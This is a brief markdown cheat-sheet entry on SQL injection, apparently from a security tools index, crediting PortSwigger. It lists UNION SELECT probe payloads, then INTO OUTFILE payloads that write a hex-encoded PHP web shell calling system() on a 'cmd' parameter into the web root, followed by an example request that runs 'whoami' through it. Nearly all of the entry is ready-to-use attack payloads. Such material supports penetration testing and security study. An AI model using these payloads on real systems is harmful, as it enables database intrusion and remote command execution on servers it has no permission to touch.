---
title: SQL Injection Cheat Sheet
desc: Cheat sheet for SQLi provided by PortSwigger.
tags: [SQLi]
alts: [Sqlmap]
website: https://portswigger.net/web-security/sql-injection/cheat-sheet
---

```
' UNION SELECT NULL,NULL#
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL--

```

<br />

## Write file

- Write new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
- Access to http://10.0.0.1/shell.php?cmd=whoami

```
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E--
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
```